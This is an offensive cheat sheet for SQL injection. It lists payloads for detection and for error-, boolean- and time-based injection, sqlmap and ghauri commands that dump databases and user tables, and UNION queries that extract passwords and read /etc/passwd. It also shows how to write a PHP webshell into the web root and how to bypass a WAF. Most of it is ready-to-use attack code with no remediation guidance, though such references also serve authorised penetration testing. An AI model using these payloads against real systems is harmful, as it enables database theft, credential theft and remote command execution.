# SQL Injection (SQLi)

**CWE:** CWE-89 | **OWASP:** A03:2021

---

## Types

**Error-based** — Database error messages leak data in the response. Fastest to exploit manually.

**Union-based** — Append a `UNION SELECT` to extract data from other tables.

**Boolean-blind** — Response differs (content/size) based on true/false conditions. No visible output.

**Time-based blind** — Use `SLEEP()` / `WAITFOR DELAY` to infer data when there's zero visual difference.

**Out-of-band** — Trigger DNS or HTTP callbacks to exfiltrate data. Used when all other methods are blocked.

---

## Quick Detection

```sql
-- Classic
'
''
`
')
"))

-- Boolean
1 AND 1=1
1 AND 1=2
1' AND '1'='1
1' AND '1'='2

-- Error-based
' OR 1=CONVERT(int, (SELECT @@version))--
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--

-- Time-based (MySQL)
' AND SLEEP(5)--
1; SELECT SLEEP(5)--

-- Time-based (MSSQL)
'; WAITFOR DELAY '0:0:5'--

-- Time-based (PostgreSQL)
'; SELECT pg_sleep(5)--
```

---

## Automated Testing

```bash
# SQLMap
sqlmap -u "https://target.com/page?id=1" --batch --dbs
sqlmap -u "https://target.com/page?id=1" --batch -D dbname --tables
sqlmap -u "https://target.com/page?id=1" --batch -D dbname -T users --dump

# POST request
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=test" \
  --batch --level 3 --risk 2

# With cookies (authenticated)
sqlmap -u "https://target.com/api?id=1" \
  --cookie="session=TOKEN" --batch

# Tamper scripts (WAF bypass)
sqlmap -u "https://target.com?id=1" --tamper=space2comment,between --batch

# Ghauri (modern alternative)
ghauri -u "https://target.com?id=1" --dbs --batch
```

---

## Manual Union Extraction

```sql
-- Step 1: Find column count
ORDER BY 1--
ORDER BY 2--
-- (increment until error)

-- Step 2: Find printable column
UNION SELECT NULL, NULL, NULL--
UNION SELECT 'a', NULL, NULL--

-- Step 3: Extract data
UNION SELECT username, password, NULL FROM users--

-- MySQL info
UNION SELECT @@version, @@datadir, user()--

-- File read (MySQL)
UNION SELECT LOAD_FILE('/etc/passwd'), NULL, NULL--

-- Write webshell (MySQL)
UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL, NULL
  INTO OUTFILE '/var/www/html/shell.php'--
```

---

## Database Fingerprinting

**MySQL** → `SELECT @@version`

**MSSQL** → `SELECT @@version`

**PostgreSQL** → `SELECT version()`

**Oracle** → `SELECT * FROM v$version`

**SQLite** → `SELECT sqlite_version()`

---

## WAF Bypass Techniques

```sql
-- Space alternatives
SELECT/**/username/**/FROM/**/users
SEL%00ECT username FROM users

-- Case mixing
SeLeCt UsErNaMe FrOm UsErS

-- Comment injection
SE/**/LECT

-- URL encoding
%53%45%4C%45%43%54

-- Double URL encoding
%2553%2545%254C%2545%2543%2554
```
